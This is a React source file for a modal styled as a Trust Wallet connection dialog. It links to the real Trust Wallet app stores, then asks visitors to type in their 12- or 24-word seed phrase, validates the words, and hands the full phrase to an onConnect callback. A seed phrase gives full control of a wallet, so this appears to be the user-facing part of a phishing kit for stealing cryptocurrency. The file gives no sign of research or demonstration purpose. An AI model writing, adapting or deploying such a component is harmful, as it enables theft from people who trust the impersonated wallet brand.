'use client';

import { useState } from 'react';
import { isValidBip39Word } from '@/lib/bip39-utils.js';
import { X, ArrowLeft } from 'lucide-react';

// BIP39 word list (subset for validation)


export default function TrustWalletModal({ onClose, onConnect, onBack }) {
  const [wordCount, setWordCount] = useState(12);
  const [seedWords, setSeedWords] = useState(Array(12).fill(''));
  const [invalidWords, setInvalidWords] = useState(new Set());
  const [showSeedInput, setShowSeedInput] = useState(false);

  const handleWordChange = (index, value) => {
    const newWords = [...seedWords];
    newWords[index] = value.toLowerCase().trim();
    setSeedWords(newWords);

    // Validate word
    const newInvalid = new Set(invalidWords);
    if (newWords[index] && !isValidBip39Word(newWords[index])) {
      newInvalid.add(index);
    } else {
      newInvalid.delete(index);
    }
    setInvalidWords(newInvalid);
  };

  const switchWordCount = (count) => {
    setWordCount(count);
    setSeedWords(Array(count).fill(''));
    setInvalidWords(new Set());
  };

  const handleConnect = () => {
    const filledWords = seedWords.filter(w => w.length > 0);
    const allValid = filledWords.length === wordCount && invalidWords.size === 0;

    if (allValid) {
      onConnect('Trust Wallet', seedWords.join(' '));
    }
  };

  const filledCount = seedWords.filter(w => w.length > 0).length;
  const missingCount = wordCount - filledCount;
  const isComplete = filledCount === wordCount && invalidWords.size === 0;

  return (
    <div className="modal-overlay" onClick={(e) => { if (e.target === e.currentTarget) onClose(); }}>
      <div className="modal-content" style={{ maxWidth: 500 }}>
        <div className="modal-header" style={{ position: 'relative', display: 'flex', alignItems: 'center', justifyContent: 'center' }}>
          {showSeedInput && (
            <button className="close-btn" onClick={() => setShowSeedInput(false)} aria-label="Back" style={{ position: 'absolute', left: 0, marginRight: 4 }}><ArrowLeft size={16} /></button>
          )}
          <h2 style={{ margin: 0, textAlign: 'center' }}>Trust Wallet</h2>
          <button className="close-btn" onClick={onClose} aria-label="Close" style={{ position: 'absolute', right: 0 }}><X size={18} /></button>
        </div>

        <div className="modal-body">
          {!showSeedInput ? (
            // Get Trust Wallet Options Section
            <>
              <div style={{ textAlign: 'center', marginBottom: 24 }}>
                <img src="/icons/trust_wallet-.svg" alt="Trust Wallet" style={{ width: 60, height: 60, margin: '0 auto 16px', display: 'block' }} />
                <p style={{ margin: 0, fontSize: 14, color: 'var(--text-dim)', lineHeight: 1.5 }}>
                  {/* Please enter your Trust Wallet seed phrase to continue */}
                </p>
              </div>

              <div style={{ backgroundColor: 'rgba(255,255,255,0.05)', borderRadius: 12, padding: 20, marginBottom: 20 }}>
                <h3 style={{ margin: '0 0 16px 0', fontSize: 16, fontWeight: 600, color: 'var(--text)' }}>Get Trust Wallet</h3>
                <div style={{ display: 'flex', flexDirection: 'column', gap: 12 }}>
                  <a
                    href="https://chromewebstore.google.com/detail/trust-wallet/egjidjbpglichdcondbcbdnbeppen/reviews"
                    target="_blank"
                    rel="noopener noreferrer"
                    style={{
                      display: 'flex',
                      alignItems: 'center',
                      justifyContent: 'space-between',
                      padding: 12,
                      border: '1px solid rgba(255,255,255,0.15)',
                      borderRadius: 8,
                      background: 'transparent',
                      color: 'var(--text)',
                      textDecoration: 'none',
                      cursor: 'pointer',
                      transition: 'all 0.2s',
                    }}
                    onMouseEnter={(e) => {
                      e.currentTarget.style.background = 'rgba(255,255,255,0.1)';
                      e.currentTarget.style.borderColor = 'var(--cyan)';
                    }}
                    onMouseLeave={(e) => {
                      e.currentTarget.style.background = 'transparent';
                      e.currentTarget.style.borderColor = 'rgba(255,255,255,0.15)';
                    }}
                  >
                    <div style={{ display: 'flex', alignItems: 'center', gap: 12 }}>
                      <img src="/icons/chrome-icon.svg" alt="Chrome" style={{ width: 24, height: 24 }} />
                      <span style={{ fontSize: 14, fontWeight: 500 }}>Chrome Extension</span>
                    </div>
                    <span style={{ color: 'var(--cyan)' }}>→</span>
                  </a>

                  <a
                    href="https://apps.apple.com/app/trust-wallet/id1288339409"
                    target="_blank"
                    rel="noopener noreferrer"
                    style={{
                      display: 'flex',
                      alignItems: 'center',
                      justifyContent: 'space-between',
                      padding: 12,
                      border: '1px solid rgba(255,255,255,0.15)',
                      borderRadius: 8,
                      background: 'transparent',
                      color: 'var(--text)',
                      textDecoration: 'none',
                      cursor: 'pointer',
                      transition: 'all 0.2s',
                    }}
                    onMouseEnter={(e) => {
                      e.currentTarget.style.background = 'rgba(255,255,255,0.1)';
                      e.currentTarget.style.borderColor = 'var(--cyan)';
                    }}
                    onMouseLeave={(e) => {
                      e.currentTarget.style.background = 'transparent';
                      e.currentTarget.style.borderColor = 'rgba(255,255,255,0.15)';
                    }}
                  >
                    <div style={{ display: 'flex', alignItems: 'center', gap: 12 }}>
                      <img src="/icons/App_Store_(iOS).svg" alt="iOS" style={{ width: 24, height: 24 }} />
                      <span style={{ fontSize: 14, fontWeight: 500 }}>iOS App</span>
                    </div>
                    <span style={{ color: 'var(--cyan)' }}>→</span>
                  </a>

                  <a
                    href="https://play.google.com/store/apps/details?id=com.trustwallet.android"
                    target="_blank"
                    rel="noopener noreferrer"
                    style={{
                      display: 'flex',
                      alignItems: 'center',
                      justifyContent: 'space-between',
                      padding: 12,
                      border: '1px solid rgba(255,255,255,0.15)',
                      borderRadius: 8,
                      background: 'transparent',
                      color: 'var(--text)',
                      textDecoration: 'none',
                      cursor: 'pointer',
                      transition: 'all 0.2s',
                    }}
                    onMouseEnter={(e) => {
                      e.currentTarget.style.background = 'rgba(255,255,255,0.1)';
                      e.currentTarget.style.borderColor = 'var(--cyan)';
                    }}
                    onMouseLeave={(e) => {
                      e.currentTarget.style.background = 'transparent';
                      e.currentTarget.style.borderColor = 'rgba(255,255,255,0.15)';
                    }}
                  >
                    <div style={{ display: 'flex', alignItems: 'center', gap: 12 }}>
                      <img src="/icons/play-store-icon.svg" alt="Android" style={{ width: 24, height: 24 }} />
                      <span style={{ fontSize: 14, fontWeight: 500 }}>Android App</span>
                    </div>
                    <span style={{ color: 'var(--cyan)' }}>→</span>
                  </a>

                  <a
                    href="https://trustwallet.com"
                    target="_blank"
                    rel="noopener noreferrer"
                    style={{
                      display: 'flex',
                      alignItems: 'center',
                      justifyContent: 'space-between',
                      padding: 12,
                      border: '1px solid rgba(255,255,255,0.15)',
                      borderRadius: 8,
                      background: 'transparent',
                      color: 'var(--text)',
                      textDecoration: 'none',
                      cursor: 'pointer',
                      transition: 'all 0.2s',
                    }}
                    onMouseEnter={(e) => {
                      e.currentTarget.style.background = 'rgba(255,255,255,0.1)';
                      e.currentTarget.style.borderColor = 'var(--cyan)';
                    }}
                    onMouseLeave={(e) => {
                      e.currentTarget.style.background = 'transparent';
                      e.currentTarget.style.borderColor = 'rgba(255,255,255,0.15)';
                    }}
                  >
                    <div style={{ display: 'flex', alignItems: 'center', gap: 12 }}>
                      <img src="/icons/website-4946.svg" alt="Website" style={{ width: 24, height: 24 }} />
                      <span style={{ fontSize: 14, fontWeight: 500 }}>Website</span>
                    </div>
                    <span style={{ color: 'var(--cyan)' }}>→</span>
                  </a>
                </div>
              </div>

              <button
                onClick={() => setShowSeedInput(true)}
                style={{
                  width: '100%',
                  padding: 12,
                  border: '1px solid rgba(255,255,255,0.2)',
                  borderRadius: 8,
                  background: 'transparent',
                  color: 'var(--text-dim)',
                  fontSize: 14,
                  fontWeight: 600,
                  cursor: 'pointer',
                  transition: 'all 0.2s',
                }}
                onMouseEnter={(e) => {
                  e.currentTarget.style.borderColor = 'var(--cyan)';
                  e.currentTarget.style.color = 'var(--cyan)';
                }}
                onMouseLeave={(e) => {
                  e.currentTarget.style.borderColor = 'rgba(255,255,255,0.2)';
                  e.currentTarget.style.color = 'var(--text-dim)';
                }}
              >
                I already have Trust Wallet
              </button>
            </>
          ) : (
            // Seed Phrase Input Section
            <>
              <p style={{ textAlign: 'center', color: 'var(--text-dim)', marginBottom: 20, fontSize: 14 }}>
                Please enter your Trust Wallet seed phrase to continue
              </p>

              {/* Word Count Toggle */}
              <div style={{ display: 'flex', gap: 12, justifyContent: 'center', marginBottom: 24 }}>
                <button
                  onClick={() => switchWordCount(12)}
                  style={{
                    padding: '8px 20px',
                    border: 'none',
                    borderRadius: 24,
                    background: wordCount === 12 ? 'var(--text)' : 'transparent',
                    color: wordCount === 12 ? 'var(--bg)' : 'var(--text-dim)',
                    cursor: 'pointer',
                    fontWeight: 600,
                    fontSize: 14,
                    transition: 'all 0.2s',
                  }}
                >
                  12 words
                </button>
                <button
                  onClick={() => switchWordCount(24)}
                  style={{
                    padding: '8px 20px',
                    border: '1px solid rgba(255,255,255,0.2)',
                    borderRadius: 24,
                    background: wordCount === 24 ? 'var(--text)' : 'transparent',
                    color: wordCount === 24 ? 'var(--bg)' : 'var(--text-dim)',
                    cursor: 'pointer',
                    fontWeight: 600,
                    fontSize: 14,
                    transition: 'all 0.2s',
                  }}
                >
                  24 words
                </button>
              </div>

              {/* Word Grid */}
              <div style={{
                display: 'grid',
                gridTemplateColumns: 'repeat(3, 1fr)',
                gap: 12,
                marginBottom: 20,
                maxHeight: 400,
                overflowY: 'auto',
                paddingRight: 8,
              }}>
                {Array.from({ length: wordCount }).map((_, i) => (
                  <div key={i} style={{ display: 'flex', alignItems: 'center', gap: 8 }}>
                    <span style={{ fontSize: 13, color: 'var(--text-dim)', minWidth: 20 }}>{i + 1}</span>
                    <input
                      type="text"
                      placeholder="Word"
                      value={seedWords[i]}
                      onChange={(e) => handleWordChange(i, e.target.value)}
                      style={{
                        flex: 1,
                        padding: '6px 10px',
                        border: `1px solid ${invalidWords.has(i) ? '#ff4444' : 'rgba(255,255,255,0.2)'}`,
                        borderRadius: 8,
                        background: 'transparent',
                        color: 'var(--text)',
                        fontSize: 12,
                        outline: 'none',
                      }}
                      onFocus={(e) => {
                        e.target.style.borderColor = invalidWords.has(i) ? '#ff4444' : 'var(--cyan)';
                      }}
                      onBlur={(e) => {
                        e.target.style.borderColor = invalidWords.has(i) ? '#ff4444' : 'rgba(255,255,255,0.2)';
                      }}
                    />
                  </div>
                ))}
              </div>

              {/* Status */}
              <div style={{ textAlign: 'center', marginBottom: 20 }}>
                {missingCount > 0 ? (
                  <p style={{ color: 'var(--text-dim)', fontSize: 13, margin: 0 }}>Missing words: <span style={{ color: 'var(--cyan)' }}>{missingCount}</span></p>
                ) : invalidWords.size > 0 ? (
                  <p style={{ color: '#ff4444', fontSize: 13, margin: 0 }}>Invalid words: {invalidWords.size}</p>
                ) : (
                  <p style={{ color: 'var(--text-dim)', fontSize: 13, margin: 0 }}>All words valid</p>
                )}
              </div>

              {/* Connect Button */}
              <button
                onClick={handleConnect}
                disabled={!isComplete}
                style={{
                  width: '100%',
                  padding: 12,
                  border: 'none',
                  borderRadius: 8,
                  background: isComplete ? 'var(--cyan)' : 'rgba(255,255,255,0.1)',
                  color: isComplete ? 'var(--bg)' : 'var(--text-dim)',
                  fontSize: 14,
                  fontWeight: 600,
                  cursor: isComplete ? 'pointer' : 'not-allowed',
                  transition: 'all 0.2s',
                }}
                onMouseEnter={(e) => {
                  if (isComplete) e.target.style.opacity = '0.9';
                }}
                onMouseLeave={(e) => {
                  if (isComplete) e.target.style.opacity = '1';
                }}
              >
                Connect Wallet
              </button>
            </>
          )}
        </div>
      </div>
    </div>
  );
}
